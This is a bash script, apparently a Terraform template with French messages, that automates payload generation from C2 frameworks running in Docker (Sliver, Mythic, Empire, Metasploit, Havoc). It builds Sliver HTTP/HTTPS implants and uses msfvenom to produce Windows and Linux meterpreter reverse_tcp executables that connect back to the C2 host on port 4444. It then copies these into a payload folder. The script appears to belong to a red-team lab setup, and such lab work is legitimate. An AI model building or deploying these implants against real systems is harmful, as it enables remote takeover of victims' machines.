#!/bin/bash

set -e

echo "🎯 GÉNÉRATION AUTOMATIQUE DES PAYLOADS"
echo "======================================"

PAYLOAD_DIR="$(dirname "$0")"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo_status() {
    echo "[INFO] $1"
}

echo_success() {
    echo "[SUCCESS] $1"
}

echo_warning() {
    echo "[WARNING] $1"
}

echo_error() {
    echo "[ERROR] $1"
}

# Vérifier que les containers sont up
echo_status "Vérification des containers C2..."

%{ for name, ip in containers ~}
if docker ps | grep -q "${name}-c2"; then
    echo_success "${name} C2 est actif (${ip})"
else
    echo_warning "${name} C2 n'est pas actif"
fi
%{ endfor ~}

echo ""
echo_status "Génération des payloads..."

# Sliver payloads
if docker ps | grep -q "sliver-c2"; then
    echo_status "Génération des payloads Sliver..."
    docker exec sliver-c2 sliver --generate --http ${containers.sliver} --save "$PAYLOAD_DIR/sliver_http_$TIMESTAMP" || echo_warning "Sliver payload generation failed"
    docker exec sliver-c2 sliver --generate --https ${containers.sliver} --save "$PAYLOAD_DIR/sliver_https_$TIMESTAMP" || echo_warning "Sliver payload generation failed"
    echo_success "Payloads Sliver générés"
fi

# Mythic payloads
if docker ps | grep -q "mythic-c2"; then
    echo_status "Génération des payloads Mythic..."
    echo_warning "Payloads Mythic: utilisez l'interface web https://localhost:7443"
fi

# Empire payloads
if docker ps | grep -q "empire-c2"; then
    echo_status "Génération des payloads Empire..."
    echo_warning "Payloads Empire: utilisez l'interface web http://localhost:5000"
fi

# Metasploit payloads
if docker ps | grep -q "metasploit-c2"; then
    echo_status "Génération des payloads Metasploit..."
    
    # Windows payloads
    docker exec metasploit-c2 msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=${containers.metasploit} LPORT=4444 \
        -f exe -o "/tmp/meterpreter_windows_$TIMESTAMP.exe" || echo_warning "Windows payload failed"
    
    # Linux payloads  
    docker exec metasploit-c2 msfvenom -p linux/x64/meterpreter/reverse_tcp \
        LHOST=${containers.metasploit} LPORT=4444 \
        -f elf -o "/tmp/meterpreter_linux_$TIMESTAMP" || echo_warning "Linux payload failed"
    
    # Copier vers le dossier payloads
    docker cp metasploit-c2:/tmp/meterpreter_windows_$TIMESTAMP.exe "$PAYLOAD_DIR/" || true
    docker cp metasploit-c2:/tmp/meterpreter_linux_$TIMESTAMP "$PAYLOAD_DIR/" || true
    
    echo_success "Payloads Metasploit générés"
fi

# Havoc payloads
if docker ps | grep -q "havoc-c2"; then
    echo_status "Génération des payloads Havoc..."
    echo_warning "Payloads Havoc: utilisez l'interface web https://localhost:8443"
fi

echo ""
echo_success "Génération terminée!"
echo_status "Payloads disponibles dans: $PAYLOAD_DIR"
echo ""
echo "🌐 Interfaces C2:"
%{ for name, ip in containers ~}
echo "  ${name}: ${ip}"
%{ endfor ~} 